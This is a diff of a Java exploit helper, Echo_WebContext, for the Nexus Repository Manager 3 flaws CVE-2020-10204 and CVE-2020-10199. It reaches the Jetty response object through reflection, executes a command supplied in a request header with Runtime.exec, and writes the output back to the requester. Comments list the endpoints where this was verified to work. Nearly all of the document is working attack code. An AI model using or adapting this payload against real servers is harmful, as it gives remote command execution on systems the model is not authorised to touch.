@@ -1,11 +1,11 @@
 // Ref:
 // https://hu3sky.github.io/2020/04/08/CVE-2020-10204_CVE-2020-10199:%20Nexus%20Repository%20Manager3%20%E5%88%86%E6%9E%90&%E4%BB%A5%E5%8F%8A%E4%B8%89%E4%B8%AA%E7%B1%BB%E7%9A%84%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/#%E5%9B%9E%E6%98%BE
 // https://www.cnblogs.com/magic-zero/p/12641068.html
+// https://xz.aliyun.com/t/7798#toc-0
 
-import javax.servlet.ServletOutputStream;
-import org.eclipse.jetty.server.HttpOutput;
-
+import java.io.BufferedReader;
 import java.io.IOException;
+import java.io.InputStreamReader;
 import java.io.PrintWriter;
 import java.lang.reflect.Field;
 import java.lang.reflect.InvocationTargetException;
@@ -59,6 +59,10 @@ public class Echo_WebContext {
         }
     }
 
+    
+    /*
+    TODO：未验证成功
+    */
     private static void useGoogleGuiceFilterContext(Field entryValueField, Object object) throws IllegalAccessException, InvocationTargetException, NoSuchMethodException, IOException, NoSuchFieldException {
         Object httpConnection = entryValueField.get(object);
         if (httpConnection != null) {
@@ -98,8 +102,9 @@ public class Echo_WebContext {
 
 
     /*
-    适用于/service/extdirect接口；
-    /service/rest/beta/repositories/go/group接口报错。
+    已验证
+    - /service/extdirect
+    - /service/rest/beta/repositories/go/group。
 
     调用过程：
 org.eclipse.jetty.server.HttpConnection=》getHttpChannel
@@ -128,26 +133,20 @@ java.io.PrintWriter#close()
                 // 获取response对象
                 Object response = HttpChannel.getMethod("getResponse").invoke(httpChannel);
 
-
-                //java.lang.Runtime.getRuntime().exec(header);
-                //Thread.sleep(5000);
-
                 PrintWriter writer = (PrintWriter)response.getClass().getMethod("getWriter").invoke(response);
-                //ServletOutputStream writer = (HttpOutput)response.getClass().getMethod("getOutputStream").invoke(response);
 
-                String sb = "";
-                java.io.BufferedInputStream in = new java.io.BufferedInputStream(Runtime.getRuntime().exec(header).getInputStream());
-                java.io.BufferedReader inBr = new java.io.BufferedReader(new java.io.InputStreamReader(in));
-                String lineStr;
-                while ((lineStr = inBr.readLine()) != null)
-                    sb += lineStr + "\n";
-                //writer.write(sb);
-                //writer.flush();
-                writer.println(sb);
-                //writer.close();
+                StringBuilder stringBuilder = new StringBuilder();
+                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(header).getInputStream()));
+                String line;
+                while((line = bufferedReader.readLine()) != null) {
+                    stringBuilder.append(line).append("\n");
+                }
+                String res = stringBuilder.toString();
 
-                //inBr.close();
-                //in.close();
+
+                // 将命令执行的结果通过输出流输出给客户端
+                writer.write(res);
+                writer.close();
             }
         }
     }
